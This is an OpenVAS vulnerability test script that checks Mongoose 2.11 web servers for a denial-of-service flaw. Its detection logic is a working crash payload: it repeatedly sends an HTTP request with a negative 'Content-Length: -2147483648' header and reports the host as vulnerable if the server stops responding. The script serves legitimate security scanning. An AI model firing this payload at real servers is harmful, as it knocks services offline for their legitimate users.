###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mongoose_45602.nasl 12018 2018-10-22 13:31:29Z mmartin $
#
# Mongoose 'Content-Length' HTTP Header Remote Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103004");
  script_version("$Revision: 12018 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 15:31:29 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-01-03 14:40:34 +0100 (Mon, 03 Jan 2011)");
  script_bugtraq_id(45602);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Mongoose 'Content-Length' HTTP Header Remote Denial Of Service Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45602");
  script_xref(name:"URL", value:"http://www.johnleitch.net/Vulnerabilities/Mongoose.2.11.Denial.Of.Service/74");
  script_xref(name:"URL", value:"http://mongoose.googlecode.com/files/mongoose-2.11.exe");

  script_category(ACT_DENIAL);
  script_family("Web Servers");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("http_version.nasl", "find_service.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Mongoose is prone to a remote denial-of-service vulnerability because
 it fails to handle specially crafted input.");
  script_tag(name:"impact", value:"Successfully exploiting this issue will allow an attacker to crash the
 affected application, denying further service to legitimate users.");
  script_tag(name:"affected", value:"Mongoose 2.11 is vulnerable. Other versions may also be affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"exploit");

  exit(0);
}


include("http_func.inc");


port = get_http_port(default:8080);

if(http_is_dead(port:port))exit(0);

banner = get_http_banner(port: port);
if(!banner || "Server:" >!< banner)exit(0);

host = http_host_name(port:port);

req = string("GET / HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Content-Length: -2147483648\r\n\r\n");

for(i=0; i<50; i++) {

  res = http_send_recv(port:port, data:req);

  if(http_is_dead(port:port)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
